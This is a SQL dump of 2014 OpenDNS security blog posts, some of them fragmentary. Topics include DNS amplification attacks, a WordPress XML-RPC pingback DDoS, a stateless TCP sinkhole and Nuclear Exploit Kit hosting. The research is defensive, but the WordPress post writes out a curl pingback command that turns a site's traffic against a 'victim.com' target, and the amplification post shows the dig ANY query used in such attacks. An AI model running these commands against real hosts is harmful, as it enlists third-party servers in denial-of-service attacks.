INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1561, 'Evolution of the MSP', 'Dima Kumets', 'March 25, 2014', 'OpenDNS has been working with Managed Service Providers (MSPs) for almost 5 years. During that time, we’ve seen some pretty profound changes to the industry. MSPs have evolved and adapted in many ways to better suit the market, fueling incredible growth. As a product manager focusing on Umbrella for MSPs, it’s been incredible to help our partners grow and observe the evolution of the MSP.\nWhat is an MSP?\nThe commonly accepted meaning of an MSP is an IT service provider that supports its customers on a remote basis and offers an all-you-can-eat billing model.  MSPs leverage Remote Monitoring and Management tools (RMMs) to both remotely support customers and to automate routine tasks through scripting. Professional Services Automation (PSA) tools like ConnectWise and AutoTask emerged to enable MSPs to better manage workflows and optimize their businesses. The combination of PSA and RMM allowed a level of automation and continuous process improvement that has enabled MSPs to disrupt the IT services market.\nBut what does this mean to the customer?\nThe MSP model caught on with customers because it enabled them to have their IT needs taken care of for a flat monthly cost that is easy to budget. The MSP model made customer uptime the MSP’s top concern. As a customer, I don’t care why the computers are down. I just want my employees to be productive. By moving the cost of fixing IT issues from the customer to the MSP, it incentivized MSPs to be proactive, invest time in proper maintenance, and choose the solutions that were best of breed instead of those with highest resale margins.\nExpanding markets\nTraditionally, MSPs have focused on SMBs with a particular focus on the 10 to 75 employee customer size. The majority of customers are small businesses like doctor’s offices, law firms, accountants, manufacturing firms and car dealerships. These are businesses that want top notch technology but don’t want the costs or management burdens of hiring full-time IT.\nMSPs expanded to fill the role of the virtual CIO for SMBs by forecasting IT replacement costs and proposing improvements that could benefit the business.  While most still serve a variety of customers, many MSPs have focused on specific verticals such as healthcare or legal that have very specific IT needs.  However, the more interesting evolution has been in MSPs expanding into the larger end of SMB and even the mid-market with 100 to 750 employee companies.\nMSPs move to the mid-market\nLarger SMBs and mid-market organizations often have in-house IT but too often, these departments are stretched thin with heroes working tirelessly to keep their organizations running. In this situation, MSPs act as a force multiplier by extending their automated processes and larger teams to make in-house IT more effective (and let them finally have a weekend off!). In some cases this means having the in-house IT do the face-to-face help desk interactions, such as new employee set ups or troubleshooting, while escalating core service issues up to the MSP. In other cases, this means turning over server management to the MSP while keeping in-house IT to manage the end points and employee needs. While the model still hasn’t been standardized, it’s easy to see that MSPs are moving up-market with strong value props and customer demand.\nThe rise of the cloud\nAt this point nearly everyone has talked about MSPs’ opportunity in the cloud. The evolution we’re seeing is in how MSPs are executing on this opportunity.  It’s not just about offering a choice of Office365 both in-house and cloud-hosted, but about leveraging existing capabilities to offer new services. Application hosting for a wider variety of services, such as ERP and accounting, has given rise to the new breed of service provider that is easier to scale and can better serve a wider variety of customers. It also allows MSPs to practice a land-and-expand strategy of getting a customer through hosted applications and expanding the account to include full off-site managed IT.\nAnother growing market for MSPs is Virtual Desktop Infrastructure or VDI. The MSPs host the virtualized infrastructure and maintain customers’ virtual machines. This means that the end customer remotely connects to their “work computer”. The virtual desktops are hosted right next to applications to improve performance of mission-critical systems. A big benefit of this model is that since the computing happens at the server or data-center, end point hardware performance is now almost irrelevant.  All the data is also hosted remotely and lost or stolen laptops hardly disrupt the business.\nThe challenge with rolling this out in scale is getting enough bandwidth for a larger office. Here in the San Francisco Bay Area, available bandwidth varies significantly based on location. Even more importantly, the cost of bandwidth is incredibly variable based on geography. While VDI would be practical for our office in the South of Market (SoMa) area, it would be cost prohibitive or impossible for an organization over 50 employees just 30 miles away. The viability of this model is ever changing and is one we are watching closely.\nWhat’s next?\nI believe that MSPs will find new opportunity in the shift to a roaming workforce.  Work is no longer a place you go, it’s a thing you do. Workers at organizations of all sizes already take laptops on business trips and home for the weekend. However, for the millennials now entering and soon to be leading in the workforce, the ability to work remotely is a core requirement rather than a privilege. MSPs have perfected the ability to support customers remotely and should be leveraging this expertise to position themselves as the established experts for this emerging market. The next-gen MSP will enable customers to evolve and support the workforce of the future. OpenDNS’s internal slogan is that we enable the world to connect with confidence anywhere and on any device. I truly believe our MSP partners will enable the world to work anywhere with the confidence of having world-class IT support wherever they may roam.', 'Umbrella', 'https://umbrella.cisco.com/blog/2014/03/25/evolution-msp/');

If you’re like most people, you probably answered something to the effect of “kinda.” Well, let’s clear a few things up.\nThis image (above) was created using the 3D visualization tool developed by the OpenDNS Security Labs. Visualization is an increasingly important component of the big data security techniques OpenDNS uses to predict, detect and protect against the most complex and sophisticated attacks.\nWhat’s the big deal with big data?\nCompanies of all types are adopting big data practices to improve their operational efficiency and better understand their customers’ needs and wants. Businesses properly leveraging big data see higher productivity and profits than their counterparts. The power of big data is no fallacy, and the trend has gone mainstream. In fact, 70% of enterprise organizations have either deployed or are planning to deploy big data-related projects and programs, according to the 2014 IDG Enterprise Big Data Research report.\nWhat is big data?\nIt can be difficult to decipher the meaning of big data amidst the buzzwords and marketing speak. Big data is definitely big, but it is also misnamed, as Tom Davenport mentions in his new book, Big Data at Work: Dispelling the Myths, Uncovering the Opportunities.  Big Data means different things to different people, but it can be generally defined as the following:\nData that is too large, unstructured and/or rapidly changing to store and analyze using traditional database management and analysis tools.\nTo better understand big data, the core characteristics are often referred to as the four V’s of big data: volume (size), velocity (speed of change), variety (lack of structure) and veracity (trustworthiness). Many have recently been adding a fifth V, value, to highlight the importance of obtaining value from the data.\nIs bigger better?\nWith over 90% of all the data in the world having been generated in the last 2.5 years, there is no denying that big data is getting bigger. As our digital footprint rapidly increases, it is easy to get caught up in the quest to capture more and more data. While more data is often beneficial, in most cases additional data collection isn’t where organizations should be focusing their efforts. Prior to wanting more, ensure that you are making the best use of existing data. Are you successfully obtaining value from the data you already have? The value of your data does not lie in its volume – it lies in the use and reuse of it. So before making your big data even bigger, structure your existing data, analyze it, and ensure that you obtain value from it. Remember, your data is only as good as the insights you glean from it.\nWhat is the biggest risk related to the adoption of big data?\nBig data initiatives are costly. It is easy to become overwhelmed by the search for the right tools. The biggest threat that organizations face as they look to leverage big data lies in its general use and application. Companies need to spend more time thinking through the application of the data that is collected and analyzed. The majority of big data initiatives begin seeing their full ROI after 18 months. Preparation is key.\nWhat is the “next big thing” in big data?\nMany view real-time big data analytics as the next big thing. I disagree. I believe there is something much bigger. The ‘next big thing’ in big data is something that makes it easier to uncover the ‘the next big thing’. This involves getting answers to questions that would otherwise go unasked. Current big data analysis is too dependent on human intuition and initiation.\nAs Gurjeet Singh, Co-Founder and CEO of Ayasdi, states in his Fast Company article,\n“Every Big Data exploration starts with human assumptions and biases that amount to an educated guess in the form of a query … with more larger and complex datasets, it is simply too difficult for the brain to make the connections that lead to making the optimal query.”\nI believe Gurjeet is spot on, and I let him know that. There is too much reliance on asking the right questions. Automating the discovery of insight through advances in data-led discovery is the next big thing in big data. This will empower businesses to better attack big data analytics from both ends, targeted high-value questions and data-led discovery. Some of the biggest problems have solutions that are buried in data. This breakthrough in big data technology will allow us to begin finding valuable answers to questions we didn’t know to ask in the first place.', 'Umbrella', 'https://umbrella.cisco.com/blog/2014/03/20/answering-your-big-questions-on-big-data/');

Even though this type of attack has been happening for a long time we are still seeing a large number of attacks using this method.\nIn this post I will briefly describe how these attacks work and shed some light on how often they occur. I will then give you some ideas in how you can protect yourself from these attacks as a website operator and advise how you can avoid taking part in such attacks as a DNS server administrator or network administrator.\nAmplification attacks are a form of denial of service attack.  Attackers use open internet services such as DNS resolvers and NTP servers to increase the amount of bandwidth sent to the victim and overwhelming their capacity. With no bandwidth remaining to service real customer requests, the victim’s website is unable to service requests for real users. The reason it’s called an amplification attack is because the attacker only needs a small Internet connection, while still being able to deluge the victim with traffic.\nThe diagram below gives a high level overview of how a DNS amplification attack works:\n\nAs you can see, an attacker can use relatively few machines with little bandwidth to launch fairly substantial attacks. This is done by spoofing (or faking) the source IP of the DNS request such that the response is not sent back to the computer that issued the request, but instead to the victim.\nThis is easy since the protocol that DNS relies on is UDP and as such there is no verification that the source IP address is in fact the sender. Using very simple tools the attacker can send many thousands of spoofed requests to open resolvers and the responses, which are much larger than the request, amplify the amount of bandwidth sent to the victim.\nThe chart below shows the number of attacks we see over a 24 hour period.\n\nDigging into these attacks, we see that attackers often issue a special type of DNS request called an ANY request. ANY requests ask the DNS resolver for ALL information that it currently knows about the domain which may include where the mail servers are (MX records), what the IP addresses are (A records) and so on. Attackers use this type of query to maximize the size of the response sent to the victim.\nUsing our analytics platform, we can outline the exact domains used in these attacks, how long the attack lasted, who the intended victims were and the intended size of the attack. We can also estimate the approximate source location of the attacks even though the packets are spoofed. This is possible because we use Anycast which is a networking technology used to route customer requests to the nearest OpenDNS resolver in one of our datacenters around the globe. We can use this metric to estimate how distributed the attack is.\nThe table below shows a small sample of the domains used over the same 24 hour period:\n\nAttackers use both legitimate domains as well as domains used to increase the impact of the attack. For example, fkfkfkfc(.)biz is one such domain that was setup specifically to take part in these attacks.  They do this so they can fill up the DNS response to be as large as possible. Below is the dig output for this domain:\n$ dig fkfkfkfc(.)biz @109.235.51.184\n;; Truncated, retrying in TCP mode.\n; <<>> DiG 9.8.3-P1 <<>> fkfkfkfc(.)biz @109.235.51.184;; global options: +cmd;; Got answer:;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 24993;; flags: qr aa rd; QUERY: 1, ANSWER: 236, AUTHORITY: 2, ADDITIONAL: 2;; WARNING: recursion requested but not available\n;; QUESTION SECTION:;fkfkfkfc(.)biz.

A recent attack measured by Cloudflare weighed in at 400Gbps, one of the largest attacks seen to date. That would require an attacker issuing over 200,000 of the above requests per second to open resolvers around the globe.\nWhile some attacks are very short lived, we have seen several sustained attacks lasting many weeks. We also notice that while the custom crafted domains used in these attacks do change, it’s not very often, sometimes lasting many weeks.\nSo what can you do to protect yourself from such attacks?\nAs a website operator you may want to use a DDOS protection service such as those offered by Cloudflare, Verisign, and Arbor Networks.\nAs a DNS or NTP server administrator you should make sure your resolver is not open to the internet. If you use Bind you can disable recursive resolving like so:\noptions {    recursion no; };\nYou should also restrict Bind to answering questions from your internal network:\noptions {    allow-query {192.168.1.0/24;};};\nIf you use an external DNS resolver, check if it is open and suggest to the ISP or operator to restrict access to only their networks.\nWhat can I do to protect my network from participating in such attacks?\nEnsure that you are performing egress filtering on your edge devices. This type of filtering prevents spoofed packets from leaving your network, thereby preventing malicious devices in your network participating in attacks relying on the ability to send spoofed packets to the internet.\nTrouble ahead?\nIn this blog I have explained one form of amplification attack that has been abused for a long time. NTP Server amplification attacks are becoming much more common as the amplification factor can be much higher. SNMP servers are now also being used to amplify traffic and have the potential for much larger impact since the responses can be much larger than DNS and NTP. As protocol writers, service developers, network administrators, and end users we have our work cut out for us.\nAt OpenDNS we take this abuse of our service very seriously and continue to fine tune our defenses. In a future post, we’ll describe some of the cool techniques we use to mitigate our involvement in these attacks.\nAdditional Resources:\nSecurity Researcher Matteo Cantoni tracks these attacks in detail\nOpen Resolver Project\nDNS Amplification Attacks Observer\nCloudflare blog', 'Big Data;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2014/03/17/dns-amplification-attacks/');

Daniel Cid, the CTO of Sucuri, explains the story:\nIt all happened against a popular WordPress site that had gone down for many hours due to a DDOS. As the attack increased in size, their host shut them down, and then they decided to ask for help and subscribed to our CloudProxy Website Firewall.\nOnce the DNS was ported we were able to see what was going on, it was a large HTTP-based (layer 7) distributed flood attack, sending hundreds of requests per second to their server.\nDaniel and I go way back, having worked at Q1 Labs (now IBM) in addition to co-authoring the OSSEC Host-Based Intrusion Detection Guide with Rory Bray and myself. I reached out to Daniel to see if we could share information and see if OpenDNS observed the attack in some shape or form.\nOn Saturday, March 9, 2014 (when the attack commenced), OpenDNS tracked 255 unique (4838 total) IP addresses querying for the targeted site – which we shall refer to as “the target”. This caused a noticeable spike in DNS queries that registered well above the normal traffic pattern for the target:\n\nThe top 10 most active IP addresses querying the target on March 9 are shown below in an effort to communicate the magnitude:\n\nThis includes 3389 IPv4 address (A) records, 1398 IPv6 address (AAAA) records, 5 delegation signer (DS) records, 35 mail exchange (MX) records, and only 1 name server (NS) record.\nNote: A full description of the various DNS record types can be found here\nDaniel also notes that all the requests were coming from valid and legitimate WordPress sites by exploiting the XML remote procedure call (XMLRPC) used for pingbacks, trackbacks, remote access via mobile devices and many other features you’re likely very fond of.\nOne attacker can use thousands of popular and clean WordPress sites to perform their DDOS attack, while being hidden in the shadows, and that all happens with a simple ping back request to the XML-RPC file:\n\n$ curl -D - \"www.anywordpresssite.com/xmlrpc.php\" -d \'pingback.pinghttp://victim.comwww.anywordpresssite.com/postchosen\'\nBy default, this feature is enabled in all WordPress installs. A quick search on Shodan for\nxmlrpc.php\ngives us quite a few installations that could potentially be enlisted for future attacks.\nOn March 12, 2014 Brian Krebs tweeted a link that contained a list of websites used for the attack in question.\nAfter correlating Krebs’ list with our DNS intelligence, we identified 135 IP addresses that were active during the March 9, 2014 12:00 GMT and 16:00 GMT time window and using OpenDNS for name resolution.\nOnly 104 IP addresses were active at the time of our subsequent research (March 12, 2014 at 8:00 GMT). Of those 104 IP addresses 33 run WordPress with 14 of those having known vulnerabilities that could potentially lead to future compromises if left unresolved. (Note: The quick scanning of the WordPress sites to detect vulnerabilities was performed using WordPress Security Scanner).\nSucuri and OpenDNS recommends adding the following API filter to your WordPress sites to help mitigate this issue:\n\nadd_filter( ‘xmlrpc_methods’, function( $methods ) { unset( $methods[\'pingback.ping\'] ); return $methods; } );\nMore information on working with the WordPress API filter can be found here. Removing\nxmlrpc.php\nis not recommended, as it will break a number of other features that will use the API.\nLook to Brian Krebs’ website as the story develops.', 'Big Data;Malware;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2014/03/13/wordpress-ddos-visibility-opendns/');

Throughout the entire week I noted a number of general trends and themes that I thought I would share with our blog readers:\nEndpoint software. There was a disproportionate number of solutions and vendors touting end-point clients and enforcement. This included products offering forensics capabilities, action reporting, whitelisting (again), behavior monitoring (again), and sandboxing of apps.\nAnalytics and feeds.  A number of vendors touted some form of analytics solutions and/or feeds of data as a way to detect the undetectable and/or prevent the unpreventable threats.. My belief is that data on its own has minimal value without associated context, correlated data, and relevance.\nBuyers are back. In the past RSA has been dubbed one large Business Development and Career Fair. Although there was a lot of this going on, I would say that unlike past years there was also a large contingent of senior level executives, practitioners, and even technical engineering folks on the show floor and in the various sessions.\nLack of Mobile. There was definitely a much smaller buzz around all things mobile. This may be due to industry consolidation in the Mobile Device Management (MDM) space. It was even hard to find presentations on mobile threats, visibility, or even solutions to tomorrow’s mobile problems.\nMarketechting Terms: Threat, Cloud, Stream, Data, Intelligence, Context, Sky, Cloud, and Cyber\nOpenDNS Specific Activity\nPresentations and Panels.\nThe week started off for me with a panel called “Gumshoes : Security Investigative Journalists Speak Out”. We were very fortunate to have the top in the industry for our panel which focused on, among other things, privacy vs security, criminal infrastructure and attacks, nation state trends, and the investigative process. BIG thanks to Brian Krebs, Kevin Poulsen, and Nicole Perlroth for being amazing.  Following the panel I did a talk on “Using Data Breadcrumbs to Identify Attacks”. This presentation was recorded and RSA has told us it will be on posted on Youtube soon.\n\nSmall Booth : Big Data\nOur theme this year at our booth was “Small Booth BIG DATA”. Although this was obviously tongue-in-cheek we were demonstrating how we do use our massive amount of data combined with our algorithmic classifiers to predict and discover attacks. This went off very well and we had a continual stream of customers, prospects, researchers, analysts, and press in our booth.\n\nParties\nFor the second consecutive year we hosted our Research Party during RSA. This year was bigger and better than last and we had more than 300 people attend throughout the night. Unfortunately the weather did play into a larger group but the ones that came were treated to food trucks, fresh creme brûlée, and demonstration stations from several security startups.\n\nNext up we have speaking spots at Source Boston, Source Dublin, BSides NOLA, and CanSec West and we look forward to actively participating and hosting events at next years RSA.', 'Events;Security Research', 'https://umbrella.cisco.com/blog/2014/03/06/rsa-recap/');

You can access the audio archives (expiring in a week) at DNALounge’s site. The video recording is still on it’s way, but if you can’t wait, check out a similar talk we gave at BayThreat earlier this year.  \n\n \n \nOn Monday, Dhia Mahjoub (@DhiaLite) presented his talk on “Exploring Malicious Hot Spots in the ASN Space,” where he applied graph analysis and IP range tracking to not only quickly detect emerging infrastructures for Nuclear ExploitKit, but also showcase the possibility of predicting their movements and enforce containments in advance. \n\n \nThroughout the two days, there were several great presentations. Below is my list of the best BSides SF had to offer: \n– In a panel discussion lead by Jack Daniel from Tenable, analysts Wendy Nather and Javvad Malik provided insight on speaking to analysts (with a heaping helping of snark, of course).\n– Assaf Rappaport of Adallom provided an in-depth look at the anatomy of the “Ice Dagger” attacks, in which he discussed the discovery and severity of an Office 365 token disclosure vulnerability he broke last December.\n\n \n \n– Ryan Huber presented “Running at 99%: Surviving An Application DoS” (unfortunately, I wasn’t able to see his talk.) A quick search turned up a set of slideshare slides, which hopefully covers most of his BSides presentation.\n– Jared DeMott, Principal Security Reseacher from Bromium labs, gave an awesome talk on bypassing EMET. As Microsoft EMET (Enhanced Mitigation Experience Toolkit) grows in popularity, the research Jared presented is critical to knowing its limitations in order to further enhance such exploit mitigation tools, and better protect against exploitation vectors.  \n– Adam Shostack talked about threat modeling with a Star Wars theme! Star Wars fans/security pros will definitely find it both informative and entertaining. If you missed his talk at BSides, or would like to see the talk one more time, he is going to present it at Air Mozilla event this week. \nAfter the talks wrapped on Monday, all attendees were invited back to OpenDNS HQ for the official BSides SF afterparty, where food, drinks, and good times were had by all:\n\nHopefully everyone had a great week, and a safe trip home.

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1571, 'Building a Sinkhole That Never Clogs', 'OpenDNS Security Research', 'February 28, 2014', 'At OpenDNS, we frequently observe hosts and domain names whose features are similar to what we’ve previously seen with hosts serving malware, but still don’t exactly match a known pattern.\nWhile we want to block malicious content as soon as possible, we also want to keep false positives to a minimum. We don’t want to label a benign web site as Trojan/Generic.Win32 just because it is using Nginx, a non-English name, a previously inactive IP, and a dynamic DNS service. We need to gather evidence.\nInjected iframes on compromised sites can often be spotted right on the home page of a web site – but other infection vectors, other stages and C&C servers are less obvious. They might not use HTTP at all, and when they do, the exact path has to be known.\nThis is why we occasionally need to study what kind of traffic is being sent to these names before labeling and possibly permanently blocking a new cluster of suspicious names. DNS records used by malware are rarely signed, and a DNS resolver can be used to temporarily redirect queries sent to highly suspicious domains to a box dedicated to passive traffic analysis instead, often referred to as a “sinkhole”. In this post, we’ll take a closer look at how we built a scalable DNS sinkhole.\nThe C10M problem.\n“It’s time for web servers to handle ten thousand clients simultaneously, don’t you think?“\nIntroduced circa 1999, Dan Kegel’s “C10K problem” refers to different techniques to handle ten thousand clients simultaneously on a single server, even though the traditional BSD sockets API had clearly not been designed to do so.\nNetworking libraries such as Google’s Nitro hide the complexity of these techniques.\nLeveraging the same techniques, a high number of simultaneous clients has been achieved on different platforms such as Node.JS, Clojure or Erlang.\nHowever, these achievements still required beefy servers, and a large amount of memory.\nRobert Graham’s excellent talk Defending the Internet at scale pointed out that the kernel network stack is a major bottleneck for scaling network servers. Data has to bounce back and forth between the kernel and userland processes, requiring scheduling, dispatching, copying and system calls.\nNonetheless, 10 million connections or more can easily be achieved on commodity hardware by bypassing the kernel, and letting userland servers do the heavy lifting. He demonstrated this by releasing Masscan, a tool that can scan the entire Internet in under 6 minutes.\nThe TCP 3-way handshake\nA TCP packet includes a header and an optional payload. When a connection to a server is being initiated by a client, two important 32-bit values are involved: a sequence number, and an acknowledgment number.\nA typical TCP connection begins with the following handshake:\n– The client sends a packet that includes Sc0, a client-chosen sequence number.\n– The server replies with a packet that includes Ss0, a server-chosen sequence number, as well as (Sc0 + 1)\n– The client sends a packet that includes (Sc0 + 1), as well as (Ss0 + 1). This third packet can, and usually does, include a payload.\nAlthough extensions exist in order to speed up the initial handshake (TFO, TCPCT), they are not widely deployed yet.\nBetween the second and the third steps, the client checks that the packet received from the server actually includes (Sc0 + 1). After the third step, the server checks that the received packet actually includes (Ss0 + 1). If this is not the case, the packet is discarded. Provided that Sc0 and Ss0 cannot be predicted by an attacker, this mechanism makes blind injections more time-consuming than non-connected protocols such as UDP.\nThe flip side is that the server has to remember what value had been chosen for Sc0 in order to verify the acknowledgement number sent by the client at the 3rd step.\nIn addition, keeping states can quickly consume a lot of memory and CPU time. SYN flood attacks used to be a popular type of denial-of-service attacks exploiting this.\nTerminating a TCP connection\nIn order to gracefully terminate a connection, three or four packets are normally required. Each side has to indicate its intent to close the connection, after verifying that the previously received packet acknowledges the correct sequence number. This usually means that states have to be kept until the very last packet.\nAlthough the intent is usually to indicate an error, sending a packet with the RST flag also terminates a connection. And unlike the previous scheme, the connection is terminated immediately and both ways.\nIPTrap2\nReleased circa 2000, IPtrap was a tool to log unexpected connections to well-known TCP ports. IPtrap2 is a complete rewrite, designed to securely and reliably process a high amount of traffic.\nThe host we are running IPtrap2 on has two physical network interfaces:\n-The first interface is a management interface, that can only be reached from our local network.\n-The second interface is active, but not configured. It doesn’t have any IP addresses and the kernel doesn’t know of any routes to send packets through this interface. In fact, the kernel TCP/IP stack totally ignores it.\nIn this context, how can packets get routed to this interface?\nAll it actually takes for this to happen is to have an entry for it in the ARP table of the router.\nEven if the kernel TCP/IP stack ignores a physical network adapter, raw ethernet frames received by it can still be inspected by userland applications, provided that they have enough privileges to do so; raw frames can be injected as well.\nThus, we run a minimal application that listens to ARP requests coming from the router, and replies with the IP address and the MAC address we want the router to fill its ARP table with.\nThis is enough to have the router accept packets sent through this interface, as well as having it forward packets received for the sinkhole IP address.\nIPtrap2 itself also bypasses the kernel and directly reads and injects ethernet frames from/to the non-configured interface.\nWhen a TCP packet to initiate a new connection is received, and this packet’s sequence number is Sc0 , IPtrap2 replies with an acknowledgement whose sequence number Ss0 is the output of a keyed hash function:\nSS0 = Hk(source-ip || destination-ip || source-port || destination-port || uts)\n(with uts being a global time stamp updated every 64 seconds.)\nAfter receiving this acknowledgement, a client can follow through and send a new packet, this time with a payload.\nIn order to mitigate spoofing attacks, this packet must include an acknowledgment number (Ss0 + 1).\nWhen such a packet is received, the source and destination IP addresses and ports are decoded and a possible valid authentication tag for this packet is computed:\nt1 = 1 + Hk(source-ip || destination-ip || source-port || destination-port || uts)\nIf t1 = (Ss0 + 1), the client is very likely to have initiated the connection.\nIf the received tag doesn’t match what was expected, it might be due to the global time stamp having changed between the acknowledgment sent by the server, and the tag verification. We thus compute a valid tag for the previous value of uts:\nt2 = 1 + Hk(source-ip || destination-ip || source-port || destination-port || uts - 64)\nIf the acknowledgment number (S0 + 1) sent by the client doesn’t match t2 either, the packet is ignored. This is a common technique to mitigate some denial-of-service attacks (SYN Cookies).\nIf (Ss0 + 1) matches t1 or t2, the metadata and the payload are sent to a ZeroMQ socket for further inspection (see below), and a packet acknowledging the client data and closing the connection (ACK/RST) is sent as a response.\nNote that we never ever have to keep a state. Using a keyed hash function let us verify acknowledgment numbers sent by clients without having to keep track of what sequence numbers were initially sent to them.\nAs a result, memory usage is constant and no lookups are required, no matter how many clients are simultaneously connected or connecting.\nFull-featured TCP/IP stack are way more complicated. In particular, IPtrap2 doesn’t deal with fragmentation. However, its simplicity makes it fast, scalable, and a relief for system operators since it is isolated from the kernel network stack, and no kernel tuning is required.\nProcessing the output\nBecause it is decoding raw ethernet frames, IPtrap2 doesn’t “listen” to a specific set of TCP ports. It actually captures any TCP packet, on any port. Obviously, none of these can be used for amplification attacks, as the server negotiates connections but never sent any payloads.\nThe output of nmap scanning the sinkhole is thus quite unusual.\nOnly the first packet containing a payload is accepted, and the connection is dropped immediately after. This initial packet is all we need for our research. It is enough to have an idea of what protocol is being used, and get a path in addition to a domain name hosting a HTTP service.\nSinkholed data is primarily meant to be processed by real time classifiers. This is why the output of IPtrap2 is also a ZeroMQ stream, allowing multiple models to simultaneously process the same data.\nPackets are currently encoded as JSON objects, soon to be replaced by Cap’n Proto in order to handle binary payloads better and faster.\nThe OpenDNS sinkhole is a welcome addition to our toolbox in order to keep blocking malware as soon as possible while still having a very low number of false positives.', 'Open Source;Security Community;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2014/02/28/dns-sinkhole/');

In addition, we’ll share information about our efforts to monitor, block, and eradicate these malicious domains – such as the recent take down campaign carried out in conjunction with the team at MalwareMustDie, which resulted in 174 Nuclear Exploit Kit domains being shut down thus far [4] (the operation is still ongoing).\nFirst, a quick review of malvertising, a regular infection vector for Internet users. During this type of attack, malicious ads are injected into legitimate online advertising networks, leading unsuspecting users to sites hosting exploit kits and eventually dropping malware onto victims’ machines. A few advertising networks like Clicksor and Klixfeed are occasionally abused, and recent campaigns involving PopOnClick and Klixfeed leading to Nuclear Exploit Kit and Zbot trojan dropping were reported by security researcher @malekal_morte on Feb 11th and 13th [5].\nThe exploit landing sites in question correspond to a known stream of Nuclear Pack Exploit Kit domains abusing the .pw ccTLD – a list of domains we have been monitoring and blocking as soon as they go live (see the “Predicting the Emergence of Exploit Kit and Malware Domains” section in [6] and [7] for more information).\nMonitoring the Evasive Patterns\nFor the past few months, the bad actors behind these Nuclear Pack domains have been abusing OVH’s (hosting provider) IP space by hosting subdomains on small sub-allocated blocks of contiguous IPs. We have been observing a similar pattern across several IP ranges recently, e.g. [8][9], patterns which were also reported by other security researchers [10].\nAs an example, let’s look at the range (192.95.10.208/28) i.e. 192.95.10.208 to 192.95.10.223. In this case, the set of 16 IPs had actively hosted about 9790+ Nuclear Pack subdomains between Jan 11th and Feb 2nd. Subsequently, new IP ranges have been used to host Nuclear Pack, for example, 192.95.43.160/28 and 192.95.7.224/28.\nRecent efforts by security researchers in reporting this abuse lead OVH to neutralize this stream of malicious IPs on their IP space. The bad actors then switched to a Ukrainian hosting provider, besthosting.ua. At the time of publication, the bad actors have been using the range 31.41.221.130 to 31.41.221.140 and 31.41.221.142 since Feb 7th [11]. Notice these IPs are hosting nginx web server 0.7.67 as the exploit kit webserver. The IPs are not brought online by the bad actors all at once, but in small blocks over time, just when they are about to be used.

We were thrilled to find out that we ranked highest in the list. Being recognized as the best by the people evaluating the best enterprise security offerings is a great feeling.\nIn Somaini’s words:\nOpenDNS came out way ahead of all other vendors. While they have been around for some time, since 2005, their core value of threat and policy management via DNS is a strong value with 43% of people saying they provide “High Value”.  It’s also interesting to note that the root of the company was in consumer security and only recently, in the past couple of years, made the move into the Enterprise.  With this the value is resonating significantly amongst CISO’s.  We should see much more of them in the future as they make their push farther. Competitively, it looks like they have a solid ownership as I struggle to see anyone competing with them in their space.\nBut here’s something else that is interesting: Somaini’s survey had us listed as “Other” when it came to describe what market we fit into. Not “Secure Web Gateway,” not “SIEM,” not “Application Security.” Just “Other.” This seems like a trend for us. In Gartner’s “Market Trends: Cloud-Based Security Services Market, Worldwide, 2014” we were also mentioned as a Vendor to Watch in the “Other Security” category.\nThe “other” category in the security space represents the security disrupters that do not fit the “traditional” security categories. However, if we think back, that category has previously included great security companies like Palo Alto Networks & FireEye.  We’re in good company.\nThe “other” category represents companies that look at customer problems and design a new approach to solve it. FireEye accomplished this with their advanced behavior analysis appliance. Palo Alto Networks did it with their approach to application identification, bringing newfound utility to the aging Firewall market. In our case, we’re helping to solve the challenges created by the eroding network perimeter and the rise of the sophisticated attacker. We attack both problems by looking at the last 35 years of enterprise security best practices and applying them to the world we work in today.  It’s great to be recognized for our outside-the-perimeter way of thinking, and we’re excited to bring it to more customers.\nThanks to the security practitioners and to Justin for the visibility and recognition.

But that’s not all – in order to provide a better analysis of the modern security threats, we also required an intelligent way to build appropriate datasets. Through the combination of 3D knowledge and improved use of the Ripple Effect, we are now able to deliver high resolution videos of our powerful Security Graph.\nBefore exploring this topic further, let’s take a look at our first video:\nWikileaks\n\nSo, what are we looking at here?\nThis video presents a dataset extracted from our Security Graph with a single starting point: Wikileaks.org. At first glance, you’ll notice that the graph nodes have different colors. In this case, we used a different color to represent each entity type:\nBlue: Domain\nYellow: IP address\nGreen: AS number\nThe edges between the nodes represent different connection types:\nDomain to IP: A certain domain is mapped to a certain IP\nIP to ASN: A certain IP belongs to a certain ASN\nDomain to Domain: Related domain or Co-occurrences. Every co-occurrence connection comes with a confidence score. The speed of the co-occurrence edge particle is mapped to this confidence score – the higher the score, the faster the speed.\nCarding sites\n\nThis dataset was extracted from the following list of domains, which are shown in a circle at the center of the graph:\nfullz-mart.biz\ngavi.cc\nhhfun.com\nhidden-crime.biz\nkreditkarten.ru\nlampeduza.net\nlampeduza.so\noctavian.su\nomerta.cc\nvalidmarket.ru\nvalidservice.su\nwww.cardsmarket.su\nwww.devil-group.com\nwww.foreverpp.ru\nxcarder.net\nThese domains were analyzed in our recent blog post, “Examining the Target Attack and Carding Sites Using Security Graph“.\nFor this video, we basically extracted all the co-occurrences of those domains on 4 levels. The color code here is slightly different from the WikiLeaks video; as we had several new domains to study, we wanted to know which we were already blocking/whitelisting. So the adjusted color code is as follows:\nGreen: Whitelisted\nRed: Blacklisted\nGray: Unknown (Not blocked)\nWe only have one color for the edges (pink), as we are strictly focusing on the co-occurrence graph (the edge particles still represent the confidence score).\nIt’s interesting to note that most of this co-occurrence neighborhood orbits in the same themes : Carding, Bitcoin trading and some anarchist content.\nConclusion\nHopefully you enjoyed watching these videos, which introduce a new, interactive way to look at data. Their purpose extends beyond the aesthetic, as well – these visualizations are helping our amazing research team take threat-detection to the next level by allowing them to view connections between domains more easily than ever before. This set of videos represents only our first foray into illustrating the power of the Security Graph, with more on the way.

